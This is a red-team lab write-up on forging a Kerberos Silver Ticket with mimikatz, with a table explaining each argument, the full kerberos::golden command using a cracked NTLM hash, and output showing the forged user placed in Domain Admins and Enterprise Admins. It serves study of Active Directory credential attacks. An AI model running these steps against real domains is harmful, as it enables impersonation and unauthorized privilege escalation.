---
description: Credential Access
---

# Kerberos - Silver Tickets

This lab looks at the technique of forging a cracked TGS Kerberos ticket in order to impersonate another user and escalate privileges from the perspective of a service the TGS was cracked for.

This lab builds on the explorations in Kerberoasting where a TGS ticket got cracked.

## Execution <a id="execution"></a>

I will be using mimikatz to create a Kerberos Silver Ticket - forging/rewriting the cracked ticket with some new details that benefit me as an attacker.

Below is a table with values supplied to mimikatz explained and the command itself:

| Argument | Notes |
| :--- | :--- |
| /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 | SID of the current user who is forging the ticket. Retrieved with `whoami /user` |
| /target:dc-mantvydas.offense.local | server hosting the attacked service for which the TGS ticket was cracked |
| /service:http | service type being attacked |
| /rc4:a87f3a337d73085c45f9416be5787d86 | NTLM hash of the password the TGS ticket was encrypted with. `Passw0rd` in our case |
| /user:beningnadmin | Forging the user name. This is the user name that will appear in the windows security logs - fun. |
| /id:1155 | Forging user's RID - fun |
| /ptt | Instructs mimikatz to inject the forged ticket to memory to make it usable immediately |

Getting our user's SID as explained in the first step in the above table:![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKOW-TxXGxgVJt_NsoH%2F-LKOT31MW-F9XQ9dl177%2Fsilver-tickets-whoami.png?alt=media&token=c5db8357-b6f6-4f28-81b0-fda6b5fd5655)Getting a user's SID

Issuing the final mimikatz command to create our forged \(silver\) ticket:

```text
attacker@victim mimikatz # kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:beningnadmin
```

Checking available tickets in memory with `klist` - note how the ticket shows our forged username `benignadmin` and a forged user id:![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKOW-TxXGxgVJt_NsoH%2F-LKOTZW-kHv8wYkCCzlI%2Fsilver-tickets-generated-ticket.png?alt=media&token=89480823-2f51-48a9-b5e0-322f814925fc)

Note in the above mimikatz window the `Group IDs` which our fake user `benignadmin` is now a member of due to the forged ticket:

| GID | Group Name |
| :--- | :--- |
| 512 | Domain Admins |
| 513 | Domain Users |
| 518 | Schema Admins |
| 519 | Enterprise Admins |
| 520 | Group Policy Creator Owners |

![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKOW-TxXGxgVJt_NsoH%2F-LKOVuIT9gVZ7i2Wlu2g%2Fsilver-tickets-groups.png?alt=media&token=7250ade2-eae1-43e2-b7d3-86037bd8c095)

Initiating a request to the attacked service with a TGS ticket - note that the authentication is successfull:

```text
attacker@victimInvoke-WebRequest -UseBasicParsing -UseDefaultCredentials http://dc-mantvydas.offense.local
```

![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKOW5yEVyaRsq-SW2bf%2F-LKOWwBBzah8KLDwu1gF%2Fsilver-tickets-httprequest.png?alt=media&token=c3d8bcd6-cf86-4f79-8f20-e001ab2fa2de)

